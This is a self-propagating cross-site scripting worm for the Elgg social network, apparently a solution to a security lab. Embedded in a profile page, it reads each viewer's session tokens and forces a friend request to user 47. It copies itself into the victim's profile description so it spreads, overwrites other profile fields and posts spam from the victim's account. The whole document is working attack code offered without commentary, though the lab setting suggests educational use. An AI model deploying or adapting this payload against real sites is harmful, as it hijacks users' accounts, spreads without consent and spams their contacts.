<script type="text/javascript" id="worm">
	function randomString(length) {
	var result = "";
	var characters = "abcdefghijklmnopqrstuvwxyz";
	for (var i = 0; i < length; i++) {
	result += characters.charAt(Math.floor(Math.random() * 26));
	}
	return result;
	}

	window.onload = function() {
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

	if(elgg.session.user.guid != 47) {
	var sendurl = null;
	var Ajax = null;
	var content = null;
	
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var guid = "&guid=" + elgg.session.user.guid;
	var name = "&name=" + elgg.session.user.name;
	var url = elgg.session.user.url;

	// add Samy as a friend
	sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;
	
	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();
	

	// edit victim's profile
	// profile fields (found from edit request params)
	// add wormCode to description so that it can propagate
	var description = "&description=1605094" + wormCode + "&accesslevel[description]=1";
	var email = "&contactemail=random@gmail.com&accesslevel[contactemail]=1";
	var website = "&website=www.google.com&accesslevel[website]=1";
	var params = ts + token + guid + name + description + email + website;

	var fields = ["briefdescription", "interests", "location", "mobile", "phone", "skills", "twitter"];

	fields.forEach(function(field) {
	params += "&" + field + "=" + randomString(5);
	params += "&accesslevel[" + field + "]=1"; 
	});
	
	//Construct the content of your url.
       	sendurl="http://www.xsslabelgg.com/action/profile/edit";
	content=params; 
	
	//Create and send Ajax request to modify profile
	Ajax=new XMLHttpRequest();
	Ajax.open("POST",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type",
	"application/x-www-form-urlencoded");
	Ajax.send(content);
	

	// post on the wire from victim's profile
	var body = "&body=To earn 12 USD/Hour(!), visit now " + url; 

	//Construct the content of your url.
        sendurl="http://www.xsslabelgg.com/action/thewire/add";
	content=ts + token + body; 
	
	//Create and send Ajax request to post on the wire
	Ajax=new XMLHttpRequest();
	Ajax.open("POST",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type",
	"application/x-www-form-urlencoded");
	Ajax.send(content);
	}

	}
</script>
